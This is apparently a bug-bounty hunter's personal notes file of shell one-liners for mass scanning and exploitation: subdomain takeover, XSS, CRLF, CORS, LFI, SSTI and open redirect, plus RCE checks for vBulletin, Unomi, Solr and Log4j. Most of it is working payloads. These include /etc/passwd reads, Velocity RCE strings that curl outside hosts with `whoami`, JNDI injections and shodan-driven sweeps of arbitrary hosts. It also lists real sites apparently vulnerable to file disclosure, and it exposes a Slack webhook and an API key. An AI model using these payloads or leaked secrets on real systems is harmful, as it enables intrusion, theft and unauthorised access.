Tips for STKO - 

If the website is not used by the target which is laying in any service
provider.

Dangling CNAME Records (Lazy Admins make dns records but never claim)

We will claim them from github, heroku, shopify, zendesk,
aws, tumblr
 
Hunt subdomains using findomain use -r to see resolved subs

Hunt Acquistions by reverse whois saved in combinedsubs.txt

combinedsubs.txt | sort -u | httpx | tee finalsubs.txt 


cat hakeronexsstry.json | 



	



cat appleunique.json | awk '{print $1}' | while read host do ;do findomain -t $host -r | tee -a combined.json && subzy --targets combined.json  -hide_fails -concurrency 100 | tee -a appletakeover.json;done 



subzy --targets subs.json  -hide_fails -concurrency 100


/Users/rohit/Tools/ytlive/cve20203452/CRLF-one-liner/

input='/Users/rohit/Tools/ytlive/cve20203452/CRLF-one-liner/subdomains.txt';while IFS= read -r targets; do cat /Users/rohit/Tools/ytlive/cve20203452/CRLF-one-liner/crlf_payloads.txt|xargs -I % sh -c "curl -vs --max-time 9 $targets/% 2>&1 |grep -q '< Set-Cookie: ?crlf'&& echo $targets 'seems to be vulnerable with payload as'%>>crlf_results.txt||echo 'not vulnerable '$targets";done<$input

Modified - 
input='/Users/rohit/Tools/ytlive/cve20203452/CRLF-one-liner/subdomains.txt';while IFS= read -r targets; do cat /Users/rohit/Tools/ytlive/cve20203452/CRLF-one-liner/crlf_payloads.txt|xargs -I % sh -c "curl -vs --max-time 9 $targets/% 2>&1 |grep -q '< Set-Cookie: ?crlf'&& echo $targets '\033[0;31mVulnerable vulnerable with payload as '%>>crlf_results.txt||echo '\033[0;32mNot Vulnerable\n '$targets";done<$input






shodan search "set-cookie: webvpn;"  --fields ip_str --separator " " | awk '{print $1}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | tac | tac | grep -qs "otrizna@cisco.com" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done




Final XSS : - 

 python3 paramspider.py -d testphp.vulnweb.com > xx.json

 python3 script.py testphpxss1.json '"/><script>confirm(1)</script>'            


 cat testphpxss2.json | while read host do ;do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done




cat target.json | while read host do ; do python3 paramspider.py -d $host | tee -a combined.json && python3 script.py combined.json 	 | tee -a combinedfuzz.json ;done && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done


Mass BXSS :- 

hakrawler -plain -usewayback -wayback -url testphp.vulnweb.com | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -b https://rohitgautam.xss.ht -o out.txt


tko-subs :- 


tko-subs -domains=domains.txt -data=providers-data.csv -output=output.csv






cors  :- 


site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: null" -X GET $url) | if grep 'Access-Control-Allow-Origin: null'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done


cat targets.json | while read host do ; do waybackurls | tee -a targetscors.json && curl $host -s -I -H "Origin:hacktify.in" | grep -e "hacktify.in" -e "true";done  


&& curl $host -s -I -H "Origin: hacktify.in"  | if grep 'Access-Control-Allow-Origin: hacktify.in'; then echo [Potentional CORS Found] "$url"; else echo Nothing on: "$url";fi;done 




cat appleunique.json | awk '{print $1}' | while read host do ;do findomain -t $host -r | tee -a combined.json && subzy --targets combined.json  -hide_fails -concurrency 100 | tee -a appletakeover.json;done 
&& \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done





Wayback Hacks for Automation :- 

<script>alert(1)</script>

1 :
waybackurls testphp.vulnweb.com | tee testphp1.txt |  qsreplace '"><script>confirm(1)</script>' | tee  combinedfuzz.json  && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done



cat targets.txt| while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done










2 :
waybackurls testphp.vulnweb.com | tee testphp1.txt | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' | tee  combinedfuzz.json  && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done




| grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a 












3 : Paramspider


$ python3 paramspider.py --domain orientalbirdimages.org --exclude woff,css,js,png,svg,php,jpg --output orientalbirdimages.txt



$ python3 paramspider.py --domain orientalbirdimages.org  --output orientalbirdimages.txt --level high

$ python3 paramspider.py --domain orientalbirdimages.org  --output orientalbirdimages.txt


$ python3 paramspider.py -d testphp.vulnweb.com | tee yy.json | qsreplace xs



$ python3 paramspider.py -d optimizely.com | tee yy.json --exclude woff,css,js,png,svg,php,jpg 


waybackurls target.com | grep "=" | qsreplace '"><script>confirm(1)</script>'| while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done 







4 : gf patterns


optimizely.com
















python3 paramspider.py -d optimizely.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done







5 : hakrawler -plain -usewayback -wayback -url testphp.vulnweb.com | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | dalfox pipe -b https://rohitgautam.xss.ht -o out.txt


6.  cat bentley.json | while read host do; do ffuf -u http://$host/FUZZ -w spring.txt  -t 500 -c mc 200,403| tee $hostffuf.json;done

7.  cat testphp1.txt| kxss








<iframe style="width:80%;height:600px;" src="https://web.archive.org/web/sitemap/https://hackerone.com"></iframe>


https://web.archive.org/web/timemap/json?url=hackerone.com/&fl=timestamp:4,original,urlkey&matchType=prefix&filter=statuscode:200&filter=mimetype:text/html&collapse=urlkey&collapse=timestamp:4&limit=100000




One Liner for FUZZ : -


$ ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401	


One Liner for OR / SSRF :- 



cat /Users/rohit/Tools/hacks/bodhi/lewayback_params.txt   | head -n 5000 > google.txt; cat google.txt | sort -u | grep -a -i \=http | tee -a potential_ssrf.txt



One Liner for Open redirect :- 

waybackurls testphp.vulnweb.com   | head -n 5000 > google.txt; 	cat google.txt | sort -u | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L  $host -I|grep "evil.com" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done





One LIner SSTI :-


echo "domain" | subfinder -silent |  waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"



One Liner for LFI :-


gau testphp.vulnweb.com  | egrep -v ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | gf lfi | qsreplace "/etc/passwd" | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "root:" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done



One LIner for SDE :- 


echo 'inurl:folder= ext:pdf' | go-dork -s -p 25 | grep "=" | qsreplace "/etc/passwd" | fff -s 200 -o afd/


One Liner XSS :- 

gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt



One Liner vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution :- 

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;


shodan search http.favicon.hash:-124234705


One Liner JS files finder :-

assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done



One Liner for extract endpoints from JS Files - 

cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u




cat domains.txt| while read host do;do waybackurls $host | tee -a combinedurls.txt;done


VPS IP - 103.133.215.157

$ export PATH=$PATH:$(go env GOPATH)/bin
The scripts in the rest of this document use $GOPATH instead of $(go env GOPATH) for brevity. To make the scripts run as written if you have not set GOPATH, you can substitute $HOME/go in those commands or else run:

$ export GOPATH=$(go env GOPATH)



Coral VPS stko - 

cat 100_top1-1m-new.txt | while read host do ;do findomain -t $host -r > combined.txt  && subzy --targets combined.txt  -hide_fails -concurrency 100;done | ./slackcat





cat 100_top1-1m-new.txt | while read host do ;do findomain -t $host -r > combined.txt  


	&& subzy --targets combined.txt  -hide_fails -concurrency 100;done | ./slackcat









for i in `ls -1 | grep .zip$`; do unzip $i; done

for i in `ls -1 | grep .txt$`; do httprobe $i | tee all.txt;done


for i in `ls`; do unzip $i; done

head index1.json | grep "URL" | sed 's/"URL": "//;s/",//' | while read host do;do wget "$host";done


cat . > all.txt 

chaos -d $1 -key 072644535d0624cfbc08fdf200a50794c5bd2b0f09906fc278d137e5964a376 -silent >> $dir/$1_subd;


NEW STKO :-



cat new.txt | subfinder -silent -t 50 | httprobe -c 50 | nuclei -t /root/nuclei-templates/subdomain-takeover/detect-all-takeovers | tee op.txt | ./slackcat -u https://hooks.slack.com/services/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






Github recon - 




curl -s https://api.github.com/orgs/babbel/repos | grep  '"url":' | grep 'repos' | sed 's/"url": "//;s/repos//;s/api.//; s/",//' | while read host do; do gittyleaks -l $host;done

curl -s "https://api.github.com/orgs/babbel/repos/" | grep '“url”:' | grep 'repos' | sed 's/url”: “//g;s/repos//g';s/api.//g; s/“ ,//g'; | while read host do;do gityleaks -l $host;done




All Params for Subs - 

cat domains | xargs -I % python3 ~/Tools/ParamSpider/paramspider.py -l high -o ./spidering/paramspider/% -d % ;




XSS Mass with KXSS 

cat testphpwayback.txt| kxss | sed 's/=.*/=/' | sed 's/URL://' | sed 's/^ *//g' | dalfox pipe


cat testphpwayback.txt| kxss | sed 's/=.*/=/' | sed 's/URL: //'| dalfox pipe




Go Dorks - 

go-dork -q "php?id=1" -e duck -p 3 | tee -a sqler.txt | qsreplace '"' | while read host do;do curl --silent --insecure --path-as-is "$host" | grep "sql" | echo "$host";done













Shopify - 23.227.38.64

AWS - 

Tumblr - 














cat testphp.vulnweb.com | gf lfi | qsreplace "/etc/passwd" | while read host do;do curl --insecure -s "$host" | grep "root:";done


http://ftp.int.ru/etc/

http://www.malinovski.de/15/root/etc/passwd

http://www.dybedu.com/main/sub.php?goPage=/etc/passwd%00&menu_code=1
http://www.smelisting.net/corner_category.php?id=1522

http://www.licariautobodysupply.com/pricelist/userpwd.txt































Get all the Subdomains for a target from Chaos http Discovery without API Key.




head -20 index.json | grep "URL" | sed 's/"URL": "//;s/",//' | while read host do;do wget "$host";done && for i in `ls -1 | grep .zip$`; do unzip $i; done && rm *.zip && cat *.txt >> alltargets.txt



















export SLACK_WEBHOOK_URL="https://hooks.slack.com/services/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"








410d5a7112db06




Add HTTP :  sed 's/,//g' | sed 's/^/https:\/\//'








Apple Findings :- 23 rd Sept 2020




[host-header-injection] [http] https://av.apple.com/
[cached-pages-aem] [http] https://events.apple.com/dispatcher/invalidate.cache
[host-header-injection] [http] https://embed.apple.media/
[crlf-injection] [http] [low] http://broadmap.com/%%0D%%0ASet-Cookie:crlfinjection=crlfinjection
[crlf-injection] [http] [low] http://broadmap.com/%%0ASet-Cookie:crlfinjection=crlfinjection













./certspotter 

head bugcrowd.txt | sed 's/["]//g' | sed 's/\[//' | sed 's/\]//'


head bugcrowd.txt | sed 's/[]"[]//g'







/search/members/?id`%3D520)%2f*%2funion%2f%2fselect%2f*%2f1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2Cunhex%28%2770726f6a656374646973636f766572792e696f%27%29%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%23sqli=1






cat redmik20.txt | while read host do;do curl -s -k --insecure -path-as-is "$host" |grep -HE --color 'Only one step left!|pattern2|error' && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done





FFUF 
 with bflarge:

cat /Users/rohit/applehhof3resolved.txt  | while read host do;do ffuf -u "$host/FUZZ" -w bflarge.txt.wl -mc 200 -r -c -t 1000 -v;done  | tee -a appleffufbf.txt



TATA XSS Bypass :



https://iot.tatacommunications.com/search?q=1'-(confirm)(1)-'


<form action=https://iot.tatacommunications.com/search method=POST><input type=hidden name="q" value="1&#039;-confirm`K`-&#039;"><input type=submit value=XSS></form>

<form action=https://iot.tatacommunications.com/new-deploy/search?q=1 method=POST><input type=hidden name="news_email_id" value=""><input type=hidden name="q" value="1&#039;-confirm`K`-&#039;"><input type=submit value=XSS></form>

<form action=https://iot.tatacommunications.com/new-deploy/search?q=1 method=POST><input type=hidden name="name" value=""><input type=hidden name="companyname" value=""><input type=hidden name="mobilenumber" value=""><input type=hidden name="email" value=""><input type=hidden name="get_in_touch_msg" value=""><input type=hidden name="get_in_touch_btn" value=""><input type=hidden name="q" value="1&#039;-confirm`K`-&#039;"><input type=submit value=XSS></form>







HTTP Methods / HTTP Verb



GET       --> GET /login.php

POST      --> POST /login.php?username=praveen&pass=praveen

PUT       --> PUT to directly put something in DB.

HEAD      --> to see the head of any request.

OPTIONS   --> Which are the supported MEthods?

TRACE     --> Tracing the Server details/Server version. CMS version.

DELETE    --> to Delte something from server.


-------------------------------------------------------------

Stored XSS :- 

is a xss vuln, in which our payload is stored into the server.
THis means, everytime you open the webserver, profile page.
it will give a XSS.

--> When you save your profile, with xss payload.
--> XSS in comments, when anyone will open the comments secton he will
get attacked by xss. You will be able to steal the cookie. 



Vulnerable Web App - https://hack.me/101047/dvwa-107.html

Credentials - 

wayafa2059@ngo1.com
Admin@123




value="baby"<script>alert(1)</script>"








Client Side Validation - Validation clients end.

Client can control and edit the validations.


Server Side Validation - Valdation is done at servers end.


Client can control and edit the validations.



Password Field - Choose a password of length 8 chars, special char, alpha numeric.


Admin@123 --> Pass or Fail 




DOM XSS -   Document object Model


is the most dangerous type of xss. 

why? beacause the req is never sent to the server.


Source - We put  a payload in source

Sink   - It comes out through the sink.

As it is, then it is vulnerable to DOM XSS. 


Identify Websites -
 
https://crt.sh/?q=gov.in


cc: submitbugs@gmail.com


Saleem new code 95 color :

waybackurls testphp.vulnweb.com | tee testphp1.txt |  qsreplace '"><script>confirm(1)</script>' | tee  combinedfuzz.json  && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \e[1;31mVulnerable\e[0m\n" || echo -e "$host \e[1;34mNot Vulnerable\e[0m\n";done













Mass Hunting :- 


while read host do ;do curl --silent --path-as-is --insecure "$host/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://tinyurl.com" --connect-timeout 3| grep -qs "tinyurl" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done





Unomi RCE : 13942

cat targets.txt | while read host do;do  curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done




















Citrix cve-2020-8209
https://62.89.192.24:8443/zdm/login_xdm_uc.jsp



To do:

Passwd File   : /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd
Configuration : /opt/sas/sw/config/sftu.properties
Keys          : /opt/sas/rt/keys/security.properties






+918040455150 - Apple
FVFDC1K0J1WK



cat domains | xargs -I % python3 ~/passivehunter.py  -l high -o ./spidering/paramspider/% % ;


Import URLS to Burp :

cat shifafinal10dec_SORT.txt | parallel -j 200 curl -L -o /dev/null {} -x 127.0.0.1:8081 -k -s

propel.com
schemasoft.com
siliconcolor.com
c3technologies.com
anobit.com
chomp.com
mog.com
authentec.com
particlebrand.com
defunct-color.com
wifislam.com
catch.com
primesense.com
HopStop.com
matcha.tv
letsembark.com
algotrim.com
cueup.com
acunu.com
topsy.com
snappylabs.com
burstly.com
Novauris.com
beatsbydre.com
spotsetter.com
booklamp.org
swell.am
prss.com
unionbaynetworks.com
semetric.com
camelaudio.com
foundationdb.com
ottocat.com
dryft.com
linximaging.com
coherentnavigation.com
metaio.com
privaris.com
mapsense.co
vocaliq.com
faceshift.com
emotient.com
learnsprout.com
flybymedia.com
turi.com
legbacore.com
gliimpse.com
tuplejump.com
indoor.io
realfacetech.com
my.workflow.is
beddit.com
lattice.io
smivision.com
regaind.io
powerbyproxi.com
invisage.com
vrvana.com
spektral.com
popuparchive.com
shazam.com
nextissue.com
texture.com
akoniaholographics.com
dialog-semiconductor.com
asaiitech.com
silklabs.com
platoon.ai
datatiger.com
pullstring.com
laserlike.com
stamplay.com
tueohealth.com
drive.ai
ikinema.com
spectraledge.co.uk
xnor.ai
darksky.net
voysis.com
nextvr.com









powerschool.com
camerai.co
Mobeewave.com
stamplay.com
pullstring.com
asaiitech.com
www.silklabs.com
www.inphase-technologies.com
laserlike.com
spektral.com
popuparchive.com
invisage.com
powerbyproxi.com
init.ai
regaind.io
vrvana.com
lattice.io







https://spyse.com/advanced-search/ip?search_params=%5B%7B%22ip_as_num%22%3A%7B%22operator%22%3A%22eq%22,%22value%22%3A%224755%22%7D%7D,%7B%22ip_port_open_ports%22%3A%7B%22value%22%3A%22465%22,%22operator%22%3A%22eq%22%7D%7D%5D




FIND ASN From IP : curl --silent "http://ip-api.com/json/192.30.253.113" | jq -r .as











GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx
GO111MODULE=on go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
git clone https://github.com/projectdiscovery/nuclei-templates.git
apt-get install screen nano 
git clone https://github.com/j3ssie/Osmedeus.git
go get -u -v github.com/lukasikic/subzy
go install -v github.com/lukasikic/subzy
git clone https://github.com/chenjj/CORScanner.git
go get -u github.com/tomnomnom/httprobe
GO111MODULE=on go get -v github.com/projectdiscovery/mapcidr/cmd/mapcidr
git clone https://github.com/projectdiscovery/naabu.git; cd naabu/v2/cmd/naabu; go build; cp naabu /usr/local/bin/; naabu -version
go get -v github.com/harleo/asnip
mapcidr -cidr 173.0.84.0/24 -silent | dnsx -silent -resp-only -ptr
https://github.com/JoyGhoshs/0install/blob/main/0install


-->

cat targets.txt | subfinder  --silent | httpx -silent | nuclei -t nuclei-templates  -severity critical,high,medum,low -o nuclei.op -c 500 -bulk-size 500








cat bbdata.json.resolved | nuclei -t ~/nuclei-templates/vulnerabilites -c 500 -bulk-size 500





$i18n.getClass().forName(‘java.lang.Runtime’).getMethod(‘getRuntime’,null).invoke(null,null).exec(‘curl http://gscslw5isgh4qiqkirgy2mhkzb51tq.burpcollaborator.net/rcetest?a=a').waitFor()


gscslw5isgh4qiqkirgy2mhkzb51tq.burpcollaborator.net






httpx status code filter :

grep 200 |sed 's/\[2//g' | sed 's/\]//g' | awk {'print $1'}


$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl http://32te8o.ceye.io/`whoami`').waitFor()

$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('curl https://3f03a98d47dc0aa8c94d543febf98842.m.pipedream.net/`whoami`').waitFor()

https://3f03a98d47dc0aa8c94d543febf98842.m.pipedream.net






for d in .// ; do (cd "$d" && find -name ".txt" -print | xargs cat | httpx -silent >> nuclie.txt; cat nuclie.txt | nuclei -t /root/nuclei-templates/ -silent -o nuclie_output); done


fd txt | while read host do;do cat $host;done | httpx --silent | nuclei -t /root/nuclei-templates/ -silent -o op.txt

---------------------------------------------------------------------------------

Burp suite hackers Guide : 



IP Scanning :- 

mkdir scan
apt-get install nmap* 
apt-get install nano 
apt-get install tree screen exploitdb
GO111MODULE=on go get -v github.com/projectdiscovery/httpx/cmd/httpx
GO111MODULE=on go get -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder
GO111MODULE=on go get -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei
git clone https://github.com/projectdiscovery/nuclei-templates.git
git clone https://github.com/j3ssie/Osmedeus.git
go get -u -v github.com/lukasikic/subzy
go install -v github.com/lukasikic/subzy
git clone https://github.com/chenjj/CORScanner.git
go get -u github.com/tomnomnom/httprobe
GO111MODULE=on go get -v github.com/projectdiscovery/mapcidr/cmd/mapcidr
git clone https://github.com/projectdiscovery/naabu.git; cd naabu/v2/cmd/naabu; go build; cp naabu /usr/local/bin/; naabu -version
go get -v github.com/harleo/asnip
git clone https://github.com/laconicwolf/Nmap-Scan-to-CSV.git
git clone https://github.com/vulnersCom/nmap-vulners.git
git clone https://github.com/scipag/vulscan.git



nmap -iL file1.txt -sV -A -Pn -T5 -p- -v -oX scan.xml
python3 nmap_xml_parser.py -f /root/scan/scan.xml -csv scan.csv



subfinder -d srsecure.xyz --silent | httpx --status-code --silent | tee -a srsecurexyz.status | cat srsecurexyz.status |grep 200 |sed 's/\[2//g' | sed 's/\]//g' | awk {'print $1'}


subfinder -d srsecure.xyz --silent | httpx --silent | nuclei -t /nuclei-templates/  --silent | tee -a nucleiop.txt 





https://github.com/JoyGhoshs/0install/blob/main/0install











curl -s -k --insecure "https://api.wazirx.com/api/v2/tickers" | jq -r '.enjinr' | grep "last"


echo -e "$host \e[1;31mVulnerable\e[0m\n" || echo -e "$host \e[1;34mNot Vulnerable\e[0m\n";done





TIP: People hunting on @Apple Bug Bounty Program.
Fetch all the Rewarded Programs. 

curl -s -k --insecure "https://support.apple.com/en-us/HT201536" | grep "<p><em>" | awk '{print $2}'| sed 's/<\/em><\/p>//g'




📌  Join 7 Days for upcoming Live Online Bug Bounty Crash Course for Beginners who wants to kick start their journey. 

🔹 Details - https://drive.google.com/file/d/104rfgKWaqaIWI8DEBVMw30PyuwYXT9Sb/view
🔹 Register - https://docs.google.com/forms/d/e/1FAIpQLSfYp_Hh-5SoVy6RwPE-I1ZPYsaZ6tiRYrNyIxgkeEsGv5iE8Q/viewform
🔹 Dates - 10th April to 16th April
🔹 Certificate of Completion | Capstone Project | Tools & Support

Hurry Up, Limited Seats! 😱










Change Java version in macos 

/usr/libexec/java_home -V

export JAVA_HOME='/usr/libexec/java_home -v 15.0.1'  







cat host.txt | while read host do;do subfinder -d $host --silent | httpx --silent | tee -a $host_subs.txt | nuclei -t nuclei-templates --severity critical,high,medium,low -c 500 --bulk-size 500 | tee -a $host_nuclearop.txt;done







cat targets.txt | while read host do;do curl $host/solr/%7Bcore%7D/replication/?command=fetchindex&masterUrl=https://bugbounty.requestcatcher.com/ssrf | echo "Check SSRF resquest";done 







173.230.153.163
123.59.120.95



/solr/%7Bcore%7D/replication/?command=fetchindex&masterUrl=https://bugbounty.requestcatcher.com/ssrf

/solr/db/replication\?command=fetchindex\&masterUrl=https://bugbounty.requestcatcher.com/ssrf




/solr/{{collection}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream


gwgxdz2uwh59jeqjfi3697fe65cv0k.burpcollaborator.net



var={\"body\":{\"file\":\"file:///etc/passwd\"}}"
var={"body":{"file":"file:///etc/passwd"}}




Nuclei Tech detect :
cat nuclei.txt | cut -d ' ' -f3 | sed 's/\[//g' | sed 's/\]//g' | sed 's/tech-detect://g' | sort -u | xargs -n1 -I{} sh -c 'cat nuclei.txt | grep {} | tee -a {}.txt'







xargs -I % python3 ~/Tools/ParamSpider/paramspider.py -l high -	o ./spidering/%/% -d % ;



wget "https://chaos-data.projectdiscovery.io/index.json" && cat index.json | grep "URL" | sed 's/"URL": "//;s/",//' | while read host do;do wget "$host";done && for i in `ls -1 | grep .zip$`; do unzip $i; done && rm *.zip && cat *.txt >> alltargets.txt




wget "https://chaos-data.projectdiscovery.io/index.json" && cat index.json | grep "URL" | sed 's/"URL": "//;s/",//' | xargs -I % wget %; && for i in `ls -1 | grep .zip$`; do unzip $i; done && rm *.zip && cat *.txt | tee -a /%/%;


Bash Udemy:


1. commands videos
2. awk, sed, grep , qsreplace, cut , egrep (x5)
3. Scripts for vulns - CORS, OR, LFI , XSS, SQLi , SSTI ,
4. Subdomain Enum , JS Files, URLs extractor 
5. GF Patterns
6. ASN to IP , Status Codes
7. Fuzzing with Bash 



Nuclei-Templates









Unfollow Instagram : 

// Instagram: Unfollow
 // Updated: 2020-03-24
 // This script is made for demonstrative purposes only. 
 // Use at your own risk. 
 // Respect the Instagram's policy and terms of use.
 function initUnFollow(i) {
     setTimeout(function(){
         console.log('Unfollowing…');
         inputs[i].click(); 
       unfollow();  }, Math.floor((Math.random() * 100000))+5);
  }
   function unfollow(){
     setTimeout(function(){
   var btn = document.querySelectorAll('div[role="presentation"]:nth-child(2n) button:first-child'); btn[1].click();  }, 1000);
  }
  var inputs = document.querySelectorAll('div[role="dialog"] li button');
   for(var i=1; i<inputs.length;i++) {
     initUnFollow(i);
   }



Courses: 

Bash Course --> Major Scripts 

Membership --> 

New Burpsuite Extensions - Authorization Header Decoder
                           CSRF POC 
                           Wordlist/Params
                           JS Files 
                           Waybackurls/gau/sonar --> sort -u

Nuclei Templates         -    


Chrome Extensions        -


Private Community Discussion  - 


Bash Scripts             -














Nuclei Course : =100 Templates

Video Course 





https://www.woodlandworldwide.com/collections/search?channel=Web&clgId=10&sK=1"<!--><Svg OnLoad==confirm,(1)<!--&pN=0



requests:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Content-Type: application/x-www-form-urlencoded
        
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
        Upgrade-Insecure-Requests: 1






In the threat landscape, knowledge is your greatest weapon ⚔️ But all weapons need to be sharpened. Refine your #cybersecurity skills with AttackIQ Academy!

🧠 It’s practical
🤖 It’s open to anyone who’s ready to learn
💰 And best of all... it’s free!


Agenda:

New Vuln
Add test cases in 
Make different notion with 3 weeks vulns.







cat targets.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done   





cat target.txt | while read host do;do curl -sk --insecure --path-as-is '$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}' -H 'X-Api-Version:${jndi:ldap://log4j.requestcatcher.com/a}' -H 'User-Agent:${jndi:ldap://log4j.requestcatcher.com/a}';done
